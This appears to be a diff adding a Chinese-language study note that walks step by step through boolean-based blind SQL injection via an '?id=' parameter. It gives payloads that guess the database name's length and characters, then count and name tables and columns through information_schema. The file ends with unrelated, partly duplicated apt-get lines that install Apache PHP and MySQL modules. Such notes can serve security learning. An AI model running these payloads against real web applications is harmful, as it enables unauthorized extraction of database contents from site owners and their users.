@@ -1,0 +1,32 @@
+1.  先猜一下数据库的字符长度
+?id= 1' and length(database())=1 (2,3,4......) --+     其他两个盲注函数 left mid 
+（需要重复操作）
+2. 确定字符长度后，挨个猜字符，由此爆出库名
+?id= 1' and ascii(substr(database(),1,1))>97 (ascii码的十进制的对应数)--+
+（需要重复操作）
+3. 爆出库名后，先猜一下这个库中有几个表
+?id= 1' and (select count(table_name) from information_schema.tables where 
+table_schema='库名')=1(2,3....)--+
+（需要重复操作）
+4. 爆出有几个表后，猜第一个表名的字符长度
+?id=1' and length(substr((select table_name from information_schema.tables 
+where table_schema='库名' limit 0,1),1))=1 (2,3...)--+
+（需要重复操作）
+5. 知道了字符长度，现在挨个爆表的字符 
+
+?id= 1' and ascii(substr((select table_name from information_schema.tables 
+where table_schema='库名' limit 0,1),1,1))>97 (ascii码的十进制的对应数)--+
+（需要重复操作）
+6.爆出表名后，猜测表中的字段名的个数
+?id= 1' and (select count(column_name) from information_schema.columns where 
+table_name='表名')=1 (2,3...)--+
+（需要重复操作）
+7.采用二分法，即可猜出所有的字段名
+
+
+
+sudo apt-get install libapache2-mod-php5
+sudo apt-get install libapache2-mod-php5
+sudo apt-get install libapache2-mod-auth-mysql
+sudo apt-get install php5-mysql
+
